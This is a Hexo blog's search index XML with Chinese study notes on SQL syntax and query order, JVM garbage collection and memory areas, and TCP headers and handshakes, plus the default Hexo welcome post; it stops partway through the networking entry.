<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>刷题汇总</title>
      <link href="/algorithm/"/>
      <url>/algorithm/</url>
      
        <content type="html"><![CDATA[<p><a href="https://toyan.top/algorithm-sort/">排序算法</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/7599922.html" target="_blank" rel="noopener">剑指offer</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/7284094.html" target="_blank" rel="noopener">leetcode</a></p><p><a href="https://www.cnblogs.com/tongan-java/p/8579047.html" target="_blank" rel="noopener">动态规划</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world/"/>
      <url>/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/sql-summary/"/>
      <url>/sql-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h2><ol><li>DML语句：主要由insert、update和delete三个关键字组成</li><li>DDL语句：主要由create、alter、drop和truncate四个关键字组成</li></ol><h2 id="ddl语句"><a class="markdownIt-Anchor" href="#ddl语句"></a> DDL语句</h2><ol><li>增加列、修改列、删除列：add、modify、drop</li><li>删除表：drop table 表名;</li><li>truncate表：删除该表里的全部数据，但保留表结构；只能一次性删除整个表的全部记录；比delete删除速度要快</li><li>建立索引：create index 索引名 on 表名<br />索引的缺陷：<ul><li>当数据表中的记录被添加、删除、修改时，数据库系统需要维护索引，因此有一定的系统开销</li><li>存储索引需要一定的磁盘空间</li></ul></li><li>distinct去除重复记录</li></ol><h2 id="dml语句"><a class="markdownIt-Anchor" href="#dml语句"></a> DML语句</h2><ol><li>mysql使用concat进行字符串连接</li><li>SQL语句中的通配符：下划线代表一个任意的字符，百分号代表任意多个字符</li><li>数据库函数<ul><li>ifnull(expr1, expr2)，如果expr1为null，则返回expr2，否则返回expr1</li><li>nullif(expr1, expr2)，如果expr1和expr2相等，则返回null，否则返回expr2</li><li>if(expr1, expr2, expr3)，如果expr1为true，不等于0，且不等于null，则返回expr2，否则返回expr3</li><li>isnull(expr1)，判断expr1是否为null</li></ul></li><li>分组与组函数：avg、count、max、min和sum<ul><li>having子句：不能在where子句中过滤组，where子句仅用于过滤行。过滤组必须使用having子句；不能在where子句中使用组函数，having子句才可以使用组函数</li></ul></li><li>多表连接查询： 查询用的多个数据表显式使用xxx join连接，而不是直接依次排列在from之后，from之后只需要放一个数据表；连接条件不再放在where之后，而是提供了专门的连接条件子句<ul><li>on子句连接，每个on子句只指定一个连接条件</li><li>左、右、全外连接：left join、right join、full join<br />SQL99与SQL92的外连接恰好相反，SQL99左外连接将会把左边表中所有不满足连接条件的记录全部列出；SQL99右外连接将会把所有右边表不满足连接条件的记录全部列出；全外连接将会把两个表中所有不满足条件的记录全部列出（Mysql并不是全外连接）</li></ul></li><li>集合运算：将select返回的两个结果集做运算，intersect（交，不支持，使用多表连查来替代）、union（并）、minus（差，不支持，使用子查询来替代）<br />注意：<ul><li>两个结果集所包含的数据列的数量必须相同</li><li>两个结果集所包含的数据列的数据类型也必须一一对应</li></ul></li></ol><h2 id="sql-select语句的完整执行顺序"><a class="markdownIt-Anchor" href="#sql-select语句的完整执行顺序"></a> SQL select语句的完整执行顺序</h2><ul><li>from子句组装来自不同数据流的数据</li><li>where子句基于指定的条件对记录行进行筛选</li><li>group by子句将数据划分为多个分组</li><li>使用聚集函数进行计算</li><li>使用having子句筛选分组</li><li>计算所有的表达式</li><li>select的字段</li><li>使用order by对结果集进行排序</li></ul><p>SQL语言不同于其他编程语言最明显特征就是处理代码的顺序。在大多数据库语言中，代码按编码顺序被处理。但在SQL语言中，第一个被处理的子句是FROM，而不是SELECT，SQL查询处理的步骤编号如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(8)<span class="keyword">SELECT</span> (<span class="number">9</span>) <span class="keyword">DISTINCT</span> (<span class="number">11</span>) &lt;TOP_specification&gt; &lt;select_list&gt;</span><br><span class="line">(<span class="number">1</span>) <span class="keyword">FROM</span> &lt;left_table&gt;</span><br><span class="line">(<span class="number">3</span>) &lt;join_type&gt; <span class="keyword">JOIN</span> &lt;right_table&gt;</span><br><span class="line">(<span class="number">2</span>) <span class="keyword">ON</span> &lt;join_condition&gt;</span><br><span class="line">(<span class="number">4</span>) <span class="keyword">WHERE</span> &lt;where_condition&gt;</span><br><span class="line">(<span class="number">5</span>) <span class="keyword">GROUP</span> <span class="keyword">BY</span> &lt;group_by_list&gt;</span><br><span class="line">(<span class="number">6</span>) <span class="keyword">WITH</span> &#123;<span class="keyword">CUBE</span> | <span class="keyword">ROLLUP</span>&#125;</span><br><span class="line">(<span class="number">7</span>) <span class="keyword">HAVING</span> &lt;having_condition&gt;</span><br><span class="line">(<span class="number">8</span>) <span class="keyword">ORDER</span> <span class="keyword">BY</span> &lt;order_by_list&gt;</span><br></pre></td></tr></table></figure><p>以上每个步骤都会产生一个虚拟表，该虚拟表被用作下一个步骤的输入。这些虚拟表对调用者（客户端应用程序或者外部查询）不可用。只有最后一步生成的表才会给调用者。如果没有在查询中指定某一个子句，将跳过相应的步骤。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM虚拟机总结</title>
      <link href="/JVM-summary/"/>
      <url>/JVM-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="jvm垃圾处理方法"><a class="markdownIt-Anchor" href="#jvm垃圾处理方法"></a> JVM垃圾处理方法</h2><ul><li><p>标记-清除算法</p><ul><li>标记阶段：先通过根节点，标记所有从根节点开始的对象，未被标记的为垃圾对象</li><li>清除阶段：将所有未标记的对象清除</li></ul></li><li><p>标记-整理算法</p><ul><li>标记阶段：先通过根节点，标记所有从根节点开始的可达对象，未被标记的为垃圾对象</li><li>整理阶段：将所有的存活对象压缩到一段连续的内存空间，之后清理边界的所有空间</li></ul></li><li><p>复制算法</p><ul><li>将所有的内存空间分成两块，每次只使用一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，然后清除正在使用的内存块中的所有对象</li></ul></li></ul><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/JVM%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%89%E7%A7%8D%E7%AE%97%E6%B3%95%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="JVM虚拟机三种算法的比较" /></p><h2 id="gc"><a class="markdownIt-Anchor" href="#gc"></a> GC</h2><ol><li><p>新生代、老年代、持久代</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E6%96%B0%E7%94%9F%E4%BB%A3%E3%80%81%E8%80%81%E5%B9%B4%E4%BB%A3%E3%80%81%E6%8C%81%E4%B9%85%E4%BB%A3.png" alt="" /></p></li><li><p>GC用的可达性分析算法中，可作为GC Roots对象</p><ul><li>Java虚拟机栈中的对象</li><li>方法区中的静态成员</li><li>方法区中的常量引用对象</li><li>本地方法区中的JNI(Native方法)引用对象</li></ul></li><li><p>新生代转移到老年代的触发条件</p><ul><li>长期存活的对象</li><li>大对象直接进入老年代</li><li>Minor GC后，survivor仍然放不下</li><li>动态年龄判断，大于等于某个年龄的对象超过了survivor空间的一半，大于等于这个年龄的对象直接进入老年代</li></ul></li><li><p>MinGC、FullGC</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/MinGC%E3%80%81FullGC.png" alt="" /></p></li><li><p>各个垃圾回收器的工作方式</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Serial%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="Serial收集器" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/ParNew%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="ParNew收集器" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Parallel%20Scavenge%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="Parallel+Scavenge收集器" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/CMS%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="CMS收集器" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/G1%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="G1收集器" /></p><p>还有两个老年代收集器：Serial old和Parallel old收集器</p></li></ol><h2 id="java虚拟机内存的划分以及每个区域的功能"><a class="markdownIt-Anchor" href="#java虚拟机内存的划分以及每个区域的功能"></a> Java虚拟机内存的划分以及每个区域的功能</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Java%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA%E5%9F%9F.png" alt="Java运行时数据区域" /></p><ol><li><p>程序计数器（线程私有）</p><ul><li>线程创建时创建，执行本地方法时其值为undefined</li></ul></li><li><p>虚拟机栈（线程私有）</p><ul><li>（栈内存）为虚拟机执行Java方法服务，方法被调用时创建栈帧–&gt;局部变量表（基本数据类型，对象引用类型）–&gt;局部变量，对象引用</li><li>如果线程请求的栈深度超过了虚拟机所允许的深度，就会出现<code>StackOverfFow</code></li><li>虚拟机栈可以动态扩展，如果扩展到无法申请足够的内存时，会出现<code>OutOfMemeory</code></li></ul></li><li><p>本地方法栈（线程私有）</p><ul><li>Java虚拟机栈是为Java方法服务，而本地方法栈视为虚拟机使用到的Native方法服务</li><li>Java虚拟机没有对本地方法的使用和数据结构做强制规定。Sun HotSpot把Java虚拟机栈和本地方法栈合二为一</li><li>同样抛出<code>StackOverfFlowError</code>和<code>OutOfMemeoryError</code></li></ul></li><li><p>Java堆</p><ul><li>被所有线程所共享，在Java虚拟机启动时创建，几乎所有的对象实例都存放在这里</li><li>GC管理的主要区域</li><li>物理不连续，逻辑上连续，可以动态扩展，扩展失败抛出<code>OutOfMemeoryError</code></li></ul></li><li><p>方法区</p><ul><li>用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码的数据</li><li>Sun HotSpot虚拟机把方法区称为<code>永久代</code></li></ul></li><li><p>运行时常量池</p><ul><li>受到方法区的限制，可能抛出<code>OutOfMemeoryError</code></li></ul></li></ol><h2 id="双亲委派机制"><a class="markdownIt-Anchor" href="#双亲委派机制"></a> 双亲委派机制</h2><p><img src="https://user-gold-cdn.xitu.io/2017/5/8/74d4b5eadd9880c6ede99faefae88d24?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="类加载器双亲委派模型" /></p><p>如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而且把这个请求委派给父类加载器去完成，每一个层次的加载器都如此，因此所有的类加载器都会交给顶层的启动类加载器。只有当父类加载器无法完成该加载请求时（该加载器的搜索范围内没有找到对应的类）时，子加载器才会尝试直接去加载。</p><h2 id="student-s-new-student在内存中做的事情"><a class="markdownIt-Anchor" href="#student-s-new-student在内存中做的事情"></a> Student s = new Student()在内存中做的事情</h2><ol><li>加载Student class文件到内存</li><li>在栈内存为s开辟空间（对象引用类型）</li><li>在堆内存为学生对象开辟空间（对象实例）</li><li>对学生对象的成员变量进行默认初始化</li><li>对学生对象的成员变量进行显式初始化</li><li>通过构造方法给学生对象的成员变量进行赋值</li><li>学生对象初始化完成， 把对象地址赋值给s变量</li></ol><h2 id="java的gc为什么要分代"><a class="markdownIt-Anchor" href="#java的gc为什么要分代"></a> Java的GC为什么要分代</h2><p>分代的垃圾回收策略，是基于这样一个事实：**不同的对象的生命周期是不一样的。**因此，不同生命周期的对象可以采取不同的收集方式，以便提高回收效率。</p><blockquote><p>试想，在不进行对象存活时间区分的情况下，每次垃圾回收都是对整个堆空间进行回收，花费时间相对会长，同时，因为每次回收都需要遍历所有存活对象，但实际上，对于生命周期长的对象而言，这种遍历是没有效果的，因为可能进行了很多次遍历，但是他们依旧存在。因此，分代垃圾回收采用分治的思想，进行代的划分，把不同生命周期的对象放在不同代上，不同代上采用最适合它的垃圾回收方式进行回收。</p></blockquote><h3 id="如何分代"><a class="markdownIt-Anchor" href="#如何分代"></a> 如何分代</h3><p>虚拟机中共分为三代：年轻代、老年代和持久代。其中持久代主要存放的是Java类的类信息，与垃圾收集要收集的Java对象关系不大。年轻代和老年代是对垃圾收集影响比较大的。</p><ol><li><p>年轻代<br />所有新生成的对象首先都是放在年轻代的。年轻代的目标就是尽可能快速的收集掉那些生命周期短的对象。年轻代分为三个区。一个Eden区，两个Survivor区（一般而言）。大部分对象在Eden区中生成。当Eden区满时，还存活的对象将被复制到Survivor区（两个中的一个），当这个Survivor区也满了的时候，从第一个Survivor区复制过来的并且此时还存活的对象，将被复制到另一个Survivor区，当这个Survivor区也满了的时候，从第一个Survivor区复制过来的并且此时还存活的对象，将被复制到“老年区”。需要注意的是，Survivor的两个区是对称的，没先后顺序，所以同一个区中可能存在从Eden复制过来的对象，和从前一个Survivor复制过来的对象，而复制到老年区的只有从第一个Survivor区过去的对象。而且，Survivor区总有一个是空的。同时，根据程序需要，Survivor区是可以配置为多个的（多于两个），这样可以增加对象在年轻代中的存在时间，减少被放到老年代的可能。</p></li><li><p>老年代<br />在年轻代中经历了N次垃圾回收后仍然存活的对象，就会被放到老年代。因此，可以认为老年代中存放的都是一些生命周期较长的对象。</p></li><li><p>持久代<br />用于存放静态文件，如Java类、方法等。持久代对垃圾回收没有显著影响，但是有些应用可能动态生成或者调用一些class，例如hibernate等，在这种时候需要设置一个比较大的持久代空间来存放这些运动过程中新增的类。</p></li></ol><h2 id="minor-gc-full-gc触发条件是什么"><a class="markdownIt-Anchor" href="#minor-gc-full-gc触发条件是什么"></a> Minor GC、Full GC触发条件是什么？</h2><ul><li>从年轻代空间（包括Eden、Survivor区域）回收内存被称为Minor GC</li><li>对老年代GC称为Major GC</li><li>而Full GC是对整个堆来说</li></ul><p>在最近几个版本的JDK里默认包括了对永生代即方法区的回收（JDK8中无永生代了），出现Full GC的时候经常伴随至少一次的Minor GC,但非绝对的。</p><p>Major GC的速度一般会比Minor GC慢10倍以上。下边看看有那种情况触发JVM进行Full GC及应对策略。</p><ol><li><p>Minor GC触发条件：<br />当Eden区满时，触发Minor GC。</p></li><li><p>Full GC触发条件：</p><ul><li><p>System.gc()方法的调用</p><blockquote><p>此方法的调用是建议JVM进行Full GC，虽然只是建议而非一定，但很多情况下它会触发Full GC，从而增加Full GC的频率，也即增加了间歇性停顿的次数。虽然影响系统建议不能使用这个方法，让虚拟机自己去管理它的内存。</p></blockquote></li><li><p>老年代空间不足</p><blockquote><p>老年代空间只有在新生代对象转入及创建大对象、大数组时才会出现不足的现象，当执行Full GC后空间仍然不足，则抛出如下错误：<code>java.lang.OutOfMemoryError: Java heap space</code>，为避免以上两种情况引起的Full GC，调优时应尽量做到让对象在Minor GC阶段被回收、让对象在新生代多存活一段时间及不要创建过大的对象及数组。</p></blockquote></li><li><p>方法区空间不足</p><blockquote><p>JVM规范中运行时数据区域中的方法区，在HotSpot虚拟机中又被习惯称为永生代或者永生区，Permanet Generation中存放的为一些class的信息、常量、静态变量等数据，当系统中要加载的类、反射的类和调用的方法较多时，Permanet Generation可能会被占满，在未配置为采用CMS GC的情况下也会执行Full GC。如果经过Full GC仍然回收不了，那么JVM会抛出如下错误信息：<code>java.lang.OutOfMemoryError: PermGen space</code>。为避免Perm Gen占满造成Full GC现象，可采用的方法为增大Perm Gen空间或转为使用CMS GC。</p></blockquote></li><li><p>通过Minor GC后进入老年代的平均大小大于老年代的可用内存</p><blockquote><p>如果发现统计数据说之前Minor GC的平均晋升大小比目前old gen剩余的空间大，则不会触发Minor GC而是转为触发full GC</p></blockquote></li><li><p>由Eden区、From Space区向To Space区复制时，对象大小大于To Space可用内存，则把该对象转存到老年代，且老年代的可用内存小于该对象大小</p></li></ul></li></ol><h2 id="g1-gc"><a class="markdownIt-Anchor" href="#g1-gc"></a> G1 GC</h2><p>G1 GC是目前为止最为复杂、也是最先进的GC，在CMS算法中，GC管理的内存被划分为新生代、老年代和永久代/元空间。这些空间必须是地址连续的。在G1算法中，采用了另外一种完全不同的方式组织堆内存，堆内存被划分为多个大小相等的内存块（Region），每个Region是逻辑连续的一段内存，Region的大小可以通过<code>-XX:G1HeapRegionSize</code>参数指定，如果没有配置，默认堆内存按照2048份均分，最后得到一个合理的大小。在G1中，还有一个特殊的区域，叫Humongous 区域。</p><p>如果一个对象占用的空间超过了分区容量50%以上，G1收集器就认为这是一个巨型对象。这些巨型对象，默认直接会被分配在老年代，但是如果它是一个短期存在的巨型对象，就会对垃圾回收器造成负面影响。为了解决这个问题，G1划分了一个Humongous 区域，它用来专门存放巨型对象，下面的图片展示了G1的内存结构：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/7853175-8c5cbf9a129c4d54.png" alt="" /></p><h3 id="g1-gc内存结构"><a class="markdownIt-Anchor" href="#g1-gc内存结构"></a> G1 GC内存结构</h3><p>G1 GC的运行可以分为下面几个阶段：</p><ol><li><p>**初始标记：**扫描根集合，标记所有从根节点可直接到达的对象并将它们的字段压入扫描栈。在分代式G1模式中，初始标记阶段借用 Young GC 的暂停，因而没有额外的、单独的暂停阶段。</p></li><li><p>**并发标记：**这个阶段可以并发执行，GC线程不断从扫描栈取出引用，进行递归标记，直到扫描栈清空。</p></li><li><p>**最终标记：**重新标记写入屏障标记的对象，这个阶段也进行弱引用处理。</p></li><li><p>**筛选回收：**统计每个Region被标记位活的对象有多少，如果发现完全没有活对象的Region就会将其整体回收到可分配 Region 列表中。</p></li></ol><p>与其他GC相比，G1 GC有如下特点：</p><ol><li><p>**并行与并发：**G1 GC能充分利用CPU、多核心等硬件优势，使用多个CPU或者CPU核心来缩短STW的时间，部分其他GC需要停顿java线程执行的GC操作，在G1 GC中仍然可以通过并发的方式让java程序继续执行</p></li><li><p>**分代收集：**和其他GC一样，分代的概念在G1 GC中仍然保留</p></li><li><p>**空间整合：**与CMS的标记-清理算法不同，G1 GC从整体来看是通过”标记-整理“算法实现的GC，从局部（两个Region之间）来看是通过”复制“算法来实现的，无论如何，这两种算法在运行期间都不会产生内存碎片，GC 活动之后可以提供规整的内存空间。</p></li><li><p>**可预测的停顿：**这是G1 GC相对于CMS的另一大优势，降低停顿时间是G1 GC和CMS GC共同关注的，但是G1 GC除了追求低停顿时间外，还建立了可预测的停顿时间模型，能让使用这明确指定在一个长度为M的时间片内，消耗在垃圾收集上的事件不得超过N毫秒。</p></li></ol><p>下面的图片展示了多个GC以及他们工作的分代位置，以及如何组合使用：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/7853175-35e974e2a2f37f82.png" alt="" /></p><h3 id="jvm-gc的触发条件"><a class="markdownIt-Anchor" href="#jvm-gc的触发条件"></a> JVM GC的触发条件</h3><ol><li><p>**Young GC：**当Young generation中的Eden区分配满的时候触发。</p></li><li><p><strong>Full GC：</strong></p></li></ol><ul><li>当准备要触发一次young GC时，如果发现统计数据Young GC的平均大小比目前Old Gen剩余的空间大，则不会触发Young GC而是转为触发Full GC。</li><li>如果有Perm Gen的话，要在Perm Gen分配空间但已经没有足够空间时，也要触发一次Full GC</li><li>调用System.gc()默认也是触发Full GC</li></ul><h3 id="jvm性能监控与故障处理工具"><a class="markdownIt-Anchor" href="#jvm性能监控与故障处理工具"></a> JVM性能监控与故障处理工具</h3><ul><li><p>jps：JVM进程状况工具<br />选项：<br />-m 输出JVM进程启动时传递给主类main方法的参数<br />-l 输出主类的全名，如果进程执行的是jar包，输出jar包的路径<br />-v 输出进程启动时的JVM参数</p></li><li><p>jstat：JVM统计信息监控工具<br />该工具具有丰富的JVM统计功能，具体支持的统计可以使用man jstat来输出帮助文档</p></li><li><p>jinfo：java配置信息工具<br />jinfo用于获取当前JVM的配置信息</p></li><li><p>jmap：java内存映射工具<br />jmap用于生成堆的转储快照，下面为一个使用示例，用于将当前的JVM的堆的快照输出到文件中去</p></li><li><p>jhat：等jhat执行完毕后，就可以打开浏览器查看堆的情况的</p></li><li><p>jstack：JVM堆栈追踪工具<br />jstack用于生成当前堆栈的线程快照，这个命令会将所有在堆上的线程都输出，包括线程的运行状态，持有资源的状态等等，对于java应用调优，jstack是非常有用的。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> JVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络总结</title>
      <link href="/network-summary/"/>
      <url>/network-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="tcp报头格式"><a class="markdownIt-Anchor" href="#tcp报头格式"></a> TCP报头格式</h2><p>定义：TCP传输控制协议是一种面向连接的、可靠的、基于字节流的传输层协议。<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20140609125220296.png" alt="图一.TCP报文格式" /></p><p>图一是TCP报文格式，下面是对各参数的解释</p><ul><li>源端口号和目的端口号：TCP报头中的源端口号和目的端口号同IP数据报中的源IP与目的IP唯一确定一条TCP连接</li><li>序号：用来标识TCP发端向TCP收端发送的数据字节流</li><li>确认序号：ACK标志位为1时确认序号才有效（即不为0）；一旦连接建立，该值将始终发送</li><li>首部长度：报文头长度(单位：bit)/32<br />例子：1000（转化为十进制为8，8 * 32/8 = 32，该报文报头长度为32个字节）<br />存在该字段是因为TCP报头中任选字段长度可变<br />报头不包含任何任选字段则长度是20字节；4位所能表示的最大值为1111，转换为十进制是15，15*32/8 = 60，故报头最大长度是60字节</li><li>保留：占6位，保留为今后使用，目前应置为0</li><li>控制位：6位<ul><li>URG：紧急指针有效性标志</li><li>ACK：确认序号有效性标志，一旦一个连接建立起来，该标志位总被置为1，即除了请求建立连接报文（仅设置SYN标志位为1），其他所有报文的该标志位总为1</li><li>PSH（PuSH）：推送标志位，接收方应尽快将报文段提交至应用层，而不再等到整个缓存都填满了后再向上交付</li><li>RST（ReSeT）：重置连接标志位，当RST=1时，表明TCP连接中出现严重差错，必须释放连接，然后再重新建立运输连接</li><li>SYN：同步序号标志</li><li>FIN：传输数据结束标志</li></ul></li><li>窗口大小（2字节）：TCP流量控制通过连接的每一个端声明窗口大小进行控制（接受缓冲区大小）<br />由于2字节能够表示的最大正整数为65535，故窗口最大值为65535</li><li>检验和（2字节）：检验和覆盖整个TCP报文段；强制字段，有发送端计算存储，有接收端进行验证</li><li>紧急指针（2字节）：当URG=1时，紧急指针才有效</li><li>选项（0-40字节）：当没有使用“选项”时，TCP的首部长度是20字节</li></ul><h2 id="tcp的三次握手与四次挥手"><a class="markdownIt-Anchor" href="#tcp的三次握手与四次挥手"></a> TCP的三次握手与四次挥手</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20170104214009596.png" alt="" /></p><ol><li><p>三次握手：<br />**第一次握手：**主机A发送位码为SYN=1，随机产生seq number=10001的数据包到服务器，主机B由SYN=1知道A要求建立联机，此时状态为SYN_SENT；</p><p>**第二次握手：**主机B收到请求后要确认联机信息，向A发送ack number=（主机A的seq+1），SYN=1，ACK=1，随机产生seq number=20001的包，此时状态有LISTEN变为SYN_RECV；</p><p>**第三次握手：**主机A收到后检查ack number是否正确，即第一次发送的seq number + 1，以及位码ack是否为1，若正确，主机A会再次发送ack number = （主机B的seq+1），ACK=1，主机B收到后确认seq值与ack=1则连接建立成功，双方状态established</p><p>完成三次握手，主机A与主机B开始传送数据。</p><p><strong>各个状态名称与含义</strong></p><ul><li>CLOSED：表示初始状态</li><li>LISTEN：表示服务器端的某个socket处于监听状态，可以接受连接了</li><li>SYN_RECV：这个状态表示接受到了SYN报文，在正常情况下，这个状态是服务端的socket在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上用netstat你是很难看到这个状态的。这种状态时，当收到客户端的ACK报文后，它会进入到established</li><li>SYN_SENT：这个状态与SYN_RECV遥相呼应，当客户端socket执行connect连接时，它首先发送SYN报文，因此也随机它会进入到了SYN_SENT状态，并等到服务端的发送三次握手中的第2个报文。SYN_SENT状态表示客户端已发送SYN报文</li><li>ESTABLISHED：表示连接已经建立了。</li></ul></li><li><p>四次挥手：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/1641067-5ed8bf6c24244b4c.png" alt="" /></p><p>假设Client端发起中断请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说“我client端要发给你了”，但是如果你还没有数据要发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，“就知道可以关闭连接了，但是它还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。”，Server端收到ACK后，“就知道可以断开连接了”。Client端等待2MSL（报文最大生存时间）后仍然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。这样，TCP连接就这样关闭了。</p><p><strong>各个状态名称与含义：</strong></p><ul><li>FIN_WAIT_1：其实FIN_WAIT_1与FIN_WAIT_2状态的真正含义都是表示等待对方的FIN报文。这两种状态的区别是：FIN_WAIT_1状态实际上是当Socket在established状态时，它想主动关闭连接，向对方发送FIN报文，此时该socket即进入FIN_WAIT_1状态。而当对方回应ACK报文后，则进入FIN_WAIT_2状态。当然在实际的正常情况下，无论对方何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1状态比较难见，而FIN_WAIT_2状态可以用netstat看到。</li><li>FIN_WAIT_2：实际上该状态下的socket，表示半连接，也即有一方要求close连接，但另外还告诉对方，我暂时还有些数据要传，稍后再关闭连接。</li><li>TIME_WAIT：表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文时，则可直接进入TIME_WAIT状态，而无需经过FIN_WAIT_2状态。</li></ul></li></ol><p><strong>下面两个问题记牢</strong></p><p><strong>为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？</strong><br 